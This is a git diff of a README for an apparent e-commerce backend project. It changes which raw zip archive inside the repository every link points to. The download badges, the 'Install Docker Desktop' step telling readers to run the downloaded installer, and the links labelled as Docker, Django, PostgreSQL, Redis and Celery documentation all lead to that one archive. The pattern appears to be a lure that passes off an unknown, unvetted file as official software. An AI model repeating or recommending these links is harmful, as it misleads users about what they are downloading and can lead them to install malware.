@@ -1,6 +1,6 @@
 # 🛒 ecommerce-backend-api - Reliable E-commerce Backend Service
 
-[![Download Now](https://img.shields.io/badge/Download-ecommerce--backend--api-brightgreen?style=for-the-badge)](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip)
+[![Download Now](https://img.shields.io/badge/Download-ecommerce--backend--api-brightgreen?style=for-the-badge)](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This backend runs inside Docker containers. Docker packages everything needed to
 
 **Install Docker Desktop for Windows:**
 
-1. Go to https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
+1. Go to https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip
 2. Click **Download for Windows**.
 3. Run the downloaded installer.
 4. Follow the setup steps as directed.
@@ -55,7 +55,7 @@ You will download the backend API from the project’s release page. You do not 
 
 Go to the release page here:
 
-[![Download Releases](https://img.shields.io/badge/Download%20Page-%23007ACC?style=for-the-badge&logo=github)](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip)
+[![Download Releases](https://img.shields.io/badge/Download%20Page-%23007ACC?style=for-the-badge&logo=github)](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip)
 
 This page shows the latest versions available.
 
@@ -150,15 +150,15 @@ If you run into issues, try these steps:
 
 ## 🔗 Additional Resources
 
-- Docker Documentation: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
-- Django REST Framework: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
-- PostgreSQL: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
-- Redis: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
-- Celery: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
+- Docker Documentation: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip
+- Django REST Framework: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip
+- PostgreSQL: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip
+- Redis: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip
+- Celery: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip
 
 ---
 
 ## 💾 Download Link Again
 
 Start here to download the backend and get all necessary files:  
-[Download ecommerce-backend-api](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip)
+[Download ecommerce-backend-api](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/orders/backend_api_ecommerce_3.4.zip)
